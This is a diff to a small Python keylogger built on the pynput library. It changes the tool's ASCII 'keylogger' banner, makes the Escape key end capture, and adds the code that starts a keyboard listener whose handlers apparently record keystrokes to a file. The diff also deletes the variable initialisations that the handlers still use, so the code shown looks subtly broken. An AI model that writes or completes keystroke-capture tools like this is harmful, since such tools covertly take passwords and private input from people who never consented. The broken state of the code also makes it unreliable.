@@ -2,16 +2,15 @@ import pynput
 
 from pynput.keyboard import Key,Listener
 
-count = 0
-keys = []
-
-print(" _  _________   ___     ___   ____  ____ _____ ____ ")
-print(" | |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ ")
-print(" | ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) | ")
-print(" | . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < ")
-print(" |_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\ ")
-
-
+time.sleep(0.5)
+print("| |_ ___ _ _| |___ ___ ___ ___ ___ ")
+time.sleep(0.5)
+print("| '_| -_| | | | . | . | . | -_|  _| ")
+time.sleep(0.5)
+print("|_,_|___|_  |_|___|_  |_  |___|_| ")
+time.sleep(0.5)
+print("        |___|     |___|___| ")
+time.sleep(1)
 
 def on_key_press(key):
     global count, keys
@@ -35,4 +34,10 @@ def write_file(keys):
 
 def on_key_release(key):
     if key == Key.esc:
-        pass
+        return False
+
+
+
+
+with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+    listener.join()
